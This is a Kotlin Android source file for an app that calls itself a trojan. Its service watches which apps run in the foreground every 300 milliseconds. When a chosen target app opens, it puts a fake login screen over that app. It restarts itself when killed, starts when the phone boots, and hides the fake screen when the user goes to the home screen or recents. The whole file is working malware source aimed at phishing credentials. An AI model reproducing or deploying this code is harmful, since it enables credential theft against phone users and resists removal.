package com.lookmyup.trojanhorse

import android.app.Service
import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import java.util.concurrent.TimeUnit

class AppMonitoringService : Service() {

    companion object {
        private const val TAG = "TrojanHorse"
    }

    private val targetAppPackage = BuildConfig.TARGET_PACKAGE
    private val targetActivity = BuildConfig.TARGET_ACTIVITY
    private var lastLoggedApp = ""

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started - monitoring for all foreground apps")

        // Start monitoring in a separate thread to avoid blocking the main thread
        Thread {
            monitorForegroundApps()
        }.start()

        // Return START_STICKY to ensure the service restarts if it's killed
        return START_STICKY
    }

    private var foregroundApp = ""
    private var foregroundActivity = ""

    private fun monitorForegroundApps() {
        try {
            while (true) {
                val info = getForegroundAppAndActivity()
                if (foregroundApp == info.first && foregroundActivity == info.second) {
                    continue
                }
                foregroundApp = info.first
                foregroundActivity = info.second

                // Log all foreground apps (but avoid spamming logs with the same app repeatedly)
                if (foregroundApp.isNotEmpty() && foregroundApp != lastLoggedApp) {
                    Log.d(
                        TAG,
                        "Detected foreground app: $foregroundApp, activity: $foregroundActivity"
                    )
                    lastLoggedApp = foregroundApp
                }

                // Check if the user has switched to the target app
                if (foregroundApp == targetAppPackage) {
                    Log.d(TAG, "Target app detected - launching overlay")
                    Thread.sleep(1000)
                    launchOverlay()
                }

                // Check if home screen launcher is detected or user went to recents
                if ((foregroundApp == "com.android.launcher" && foregroundActivity == "com.android.launcher.Launcher") ||
                    (foregroundApp == "com.android.systemui" && foregroundActivity == "com.android.systemui.recents.RecentsActivity")
                ) {
                    Log.d(TAG, "Home screen or recents detected - killing Malware app")
                    killMainActivity()
                }

                // Sleep for a short period before checking again (300ms)
                Thread.sleep(300)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in monitoring: ${e.message}")
        }
    }

    private fun getForegroundAppAndActivity(): Pair<String, String> {
        var currentApp = ""
        var currentActivity = ""

        try {
            // Get UsageStatsManager
            val usageStatsManager =
                getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager

            // Define time interval (last 2 seconds)
            val endTime = System.currentTimeMillis()
            val beginTime = endTime - TimeUnit.SECONDS.toMillis(2)

            // Get usage events within the time interval
            val usageEvents = usageStatsManager.queryEvents(beginTime, endTime)
            val event = UsageEvents.Event()

            // Find the last foreground event
            while (usageEvents.hasNextEvent()) {
                usageEvents.getNextEvent(event)

                if (event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND) {
                    currentApp = event.packageName
                    currentActivity = event.className
                    Log.v(
                        TAG,
                        "MOVE_TO_FOREGROUND event: ${event.packageName} && ${event.className}"
                    )
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting foreground app: ${e.message}")
        }

        return Pair(currentApp, currentActivity)
    }

    private fun launchOverlay() {
        // Launch the fake login activity
        val overlayIntent = Intent(this, MainActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        startActivity(overlayIntent)
        Log.i(TAG, "Overlay launched for target app")
    }

    /**
     * Kills only the MainActivity while keeping the service alive
     * Uses multiple approaches for maximum reliability
     */
    private fun killMainActivity() {
        try {
            Log.d(TAG, "Attempting to kill MainActivity")
            val killIntent = Intent(MainActivity.KILL_ACTION)
            killIntent.setPackage(packageName)
            sendBroadcast(killIntent)
            Log.d(TAG, "Kill broadcast sent")
        } catch (e: Exception) {
            Log.e(TAG, "Error killing MainActivity: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Service destroyed - attempting restart")

        // Restart service if it's destroyed
        val restartServiceIntent = Intent(applicationContext, AppMonitoringService::class.java)
        startService(restartServiceIntent)
    }
}

/**
 * Boot Receiver to start the service when the device boots
 */
class BootReceiver : android.content.BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            val serviceIntent = Intent(context, AppMonitoringService::class.java)
            context.startService(serviceIntent)
            Log.d("TrojanHorse", "Device booted - starting monitoring service")
        }
    }
}
